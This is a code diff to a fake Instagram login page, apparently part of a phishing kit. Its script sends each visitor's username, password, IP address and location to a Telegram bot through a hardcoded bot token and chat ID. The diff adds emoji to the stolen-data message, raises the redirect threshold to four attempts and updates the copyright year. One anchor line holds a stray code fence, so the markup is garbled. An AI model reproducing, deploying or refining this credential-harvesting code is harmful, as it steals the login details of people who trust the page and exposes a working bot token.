@@ -96,7 +96,7 @@
             <a href="#">Blog</a>
             <a href="#">Jobs</a>
             <a href="#">Help</a>
-            <a href="#">API</a>
+            <a href="#">API</ ```html
             <a href="#">Privacy</a>
             <a href="#">Terms</a>
             <a href="#">Top Accounts</a>
@@ -105,7 +105,7 @@
             <a href="#" id="darkmode-toggle">Darkmode</a>
         </div>
         <div class="copyright">
-            © 2024 Instagram from Facebook
+            © 2025 Instagram from Facebook
         </div>
     </div>
 </div>
@@ -163,7 +163,7 @@
         const country = geoInfo.country_name;
         const state = geoInfo.region;
         const app = 'Instagram';
-        const textMessage = `*New login attempt:* \n*Username:* ${username}\n*Password:* ${password}\n*IP Address:* ${ip}\n*Country:* ${country}\n*State:* ${state}\n*App:* ${app}\n*Attempt:* Attempt ${attemptCount}`;
+        const textMessage = `🔐 *New login attempt:* \n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n🌍 *IP Address:* ${ip}\n🇺🇸 *Country:* ${country}\n🏙️ *State:* ${state}\n📱 *App:* ${app}\n🔄 *Attempt:* Attempt ${attemptCount}`;
 
         const chatId = '7330699504'; // Replace with your chat ID
         const token = '6735985278:AAHF5ASoqNBtw-jer5kAMEd2bVpUHGq4trw'; // Replace with your bot token
@@ -184,10 +184,10 @@
             console.log('Error sending message.');
         });
 
-        if (attemptCount >= 3) {
-            window.location.href = "flock.html"; // Replace with the actual URL you want to redirect to
+        if (attemptCount >= 4) {
+            window.location.href = "flock.html"; // Redirect after 4 attempts
         } else {
-            errorMessage.textContent = "Incorrect password. Try again.";
+            errorMessage.textContent = "❌ Incorrect password. Try again.";
         }
 
         // Hide the error message when the user starts typing again
